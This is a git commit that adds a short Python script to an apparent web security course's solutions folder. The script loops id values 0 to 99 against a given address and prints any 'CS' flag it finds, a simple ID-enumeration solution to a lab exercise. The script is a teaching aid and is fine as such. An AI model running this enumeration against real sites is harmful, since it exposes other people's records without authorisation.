2b6620fcefb089a9d290b7261780b46db0263840
antonimalinowski <antonimalinowski.kontakt@gmail.com>
2023-04-21 13:30:26 +0200

    Add python script for finding the flag by manipulating the id paramter of web address with brute force method

---
+++ materials_and_solutions/web_modules/introduction_to_web_applications_security/brute_force_id_parameter.py
@@ -0,0 +1,13 @@
+﻿import requests
+import sys
+import re
+
+if (len(sys.argv) != 2):
+    raise Exception('Syntax: python3 program.py ip_address')
+
+ip_address = sys.argv[1]
+
+for i in range(100):
+    r = requests.get(f'{ip_address}/?id={i}')
+    if re.search('CS[0-9]+', r.text):
+        print(re.search('CS[0-9]+', r.text))
